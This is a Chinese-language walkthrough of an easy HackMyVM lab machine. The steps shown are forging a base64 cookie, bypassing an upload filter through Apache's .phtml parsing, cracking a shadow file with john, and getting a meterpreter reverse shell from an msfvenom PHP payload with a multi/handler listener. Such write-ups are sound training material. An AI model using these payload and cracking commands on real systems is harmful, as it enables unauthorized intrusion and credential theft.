---
title: 靶场—esay
data: 2022-1-3
tags: 	
	- 靶场
---

来自于HackMyVM的Comingsoon。难度属于简单

<!-- more -->

一开始还是nmap扫描查看版本信息

![image-20220211205925981](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180931069.png)

得到了22和80，访问一下主页面看看。

80端口是一个网站![image-20220211210457228](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932946.png)

接着使用dirsearch爆破扫描目录看看

```
python dirsearch.py -u http://10.35.0.209/# -e php
```

![image-20220211211759606](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932883.png)

分别查看一下lincense.txt以及notes.txt，还有一个assets文件夹

![image-20220211212733797](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180931636.png)

![image-20220211211905990](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932570.png)

![image-20220211211915200](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932988.png)

license.txt没什么用，notes.txt说的是

![image-20220211212017154](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932145.png)

大概意思是有上传，到处翻，抓包发现cookie不对劲，像是经过base64处理了。

![image-20220211213035107](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932919.png)

![image-20220211213057497](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932645.png)

将后面的值改为true，然后进行base64编码再刷新。在这里有个小知识点，如何判断是base64加密，base64的特征大概出现最多就是，第一种密文中会出现“=”,第二种字符串长度肯定会4整数、第三种字符串涵盖A-Z、0-9、a-z和+/特殊字符。

![image-20220211213938109](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932263.png)

刷新查看，就出现了一个upload的按钮，点进去查看是一个上传页面，开始各种上传绕过了！这里还有一个知识点，因为中间件是apache，在默认的配置下有存在解析漏洞的风险，第一个是默认的phtml后缀可解析成可执行脚本代码存在指定的版本中，第二个就是apache解析从最后的“.”开始依次向左识别，假如是1111.php.11111同样会识别成php脚本文件。

![image-20220212162824546](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932952.png)

接着直接使用蚁剑直接连接

![image-20220212162857302](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932095.png)

![image-20220212163227390](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180932935.png)

在里面发现user.txt 可惜没有权限访问

notes.txt里面提示了有备份文件，直接从根找一下吧。发现了备份文件，查看里面的文件

![image-20220212163402717](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180933372.png)

将其下载下来打开查看，发现了保存的用户账户和密码

![image-20220212163603156](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180933479.png)

然后利用kali的unshadow命令的输出结果重定向至名为comhash.txt的新文件，然后再利用john获得密码

```
unshadow passwd shadow >hash.txt
```

![image-20220212164751059](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180933325.png)

kali自带密码字典rockyou.txt.gz解压命令 

```
gzip -d rockyou.txt.gz
```

![image-20220212165312486](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180933937.png)

知道了用户名和密码之后本来想用ssh进行连接，发现连不上

![image-20220212165850908](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180933679.png)

于是在用msf上传一个php木马，进行监听连接

```
msfvenom -p php/meterpreter/reverse_tcp lhost=10.17.0.137 lport=8877 R>2.phtml
```

进入msf进行监听状态

```
msfconsole 
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 10.17.0.137
set lport 8877
run
```

![image-20220212173420305](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180933167.png)

然后进入到刚刚发现的assets中的img文件夹，点击上传成功的马子

![image-20220212180306658](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180933206.png)

利用获取的用户查看user.txt 获取到管理员密码

之后登陆管理员账户查看root.txt 获取flag

![image-20220212181802911](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180933053.png)

